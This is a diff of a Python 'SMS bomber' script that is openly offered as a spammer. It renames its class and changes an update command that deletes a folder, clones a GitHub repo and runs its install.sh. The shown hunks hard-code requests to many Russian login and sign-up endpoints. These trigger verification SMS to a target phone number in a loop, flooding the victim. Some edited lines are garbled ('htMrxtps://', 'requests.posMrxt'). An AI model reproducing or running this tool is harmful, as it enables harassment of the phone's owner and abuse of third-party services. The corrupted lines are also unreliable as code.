@@ -1,7 +1,7 @@
 #!/usr/bin/python3
 # spammer v1.0
 # Author: @Mrxanon and @Krolikmerzavec
-class Mrx:
+class Bomber:
 	def main(self):
 		import requests, random, datetime, sys, time, argparse, os
 		from colorama import Fore, Back, Style
@@ -38,7 +38,7 @@ class Mrx:
 		_phone = args.phonenum
 
 		if _phone == "update":
-			cmd = os.system("cd && rm -rf ~/Mrx && git clone https://github.com/Mrx-Anonym/Mrx && sh ~/Mrx/install.sh")
+			cmd = os.system("cd && rm -rf ~/Pomegranate-Bomber && git clone https://github.com/Mrx-Anonym/Pomegranate-Bomber && sh ~/Pomegranate-Bomber/install.sh")
 			exit()
 
 		def showstatus(message, type='new'):
@@ -146,7 +146,7 @@ class Mrx:
 				requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
 				requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
 				requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
-				requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
+				requests.post('htMrxtps://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
 				requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
 				requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
 				requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'})
@@ -158,7 +158,7 @@ class Mrx:
 				requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': _phone,'g-recaptcha-response': '','recaptcha': 'on'})
 				requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
 				requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
-				requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'})
+				requests.posMrxt('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'})
 				requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
 				requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})
 				requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
@@ -195,5 +195,5 @@ class Mrx:
 				print(('{} Circle passed.').format(iteration))
 			except:
 				pass
-spammer = Mrx()
+spammer = Bomber()
 spammer.main()
